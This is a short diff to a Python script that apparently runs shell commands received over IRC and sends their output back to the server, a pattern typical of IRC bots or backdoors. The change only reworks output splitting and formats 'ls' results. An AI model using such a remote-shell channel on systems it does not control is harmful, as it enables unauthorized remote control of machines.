@@ -26,6 +26,11 @@ def generateNick(os): #generates a nick for the server
 	return str(os[:3] + rannum)
 
 def execute(cmd): #execute shell commands
+	isItLs = 0
+	if "ls" in cmd:
+		cmd += " -pA"
+		isItLs = 1
+
 	#handling a multi-word command
 	cmdList = []
 	if (cmd.find(" ") != -1):
@@ -39,21 +44,21 @@ def execute(cmd): #execute shell commands
 		output, errors = p.communicate()
 
 	#handling multi-line output
-	lines = []
-	temp = ""
-	for letter in output:
-		if (letter == '\n'):
-			lines.append(temp)
-			temp = ""
-		else:
-			temp = temp + letter
+	lines = output.split("\n")[:-1] #split based on newline, return all except last element which is just a blank new line
+	if len(lines) > 1: #if there was a new line found, return array
+		if isItLs:
+			dirs = "dirs: "
+			files = "files: "
+			for line in lines:
+				if line[-1] == "/":
+					dirs += "'" + line + "'   "
+				else:
+					files += "'" + line + "'   "
+			lines = [dirs.strip(), files.strip()]
 
-	#return one element if just a one-liner
-	if (len(lines) == 1):
-		return lines[0]
-	#return the whole list
-	else:
 		return lines
+	
+	return output
 
 #actually sending the data
 def sendData(data): #send text back to the irc server
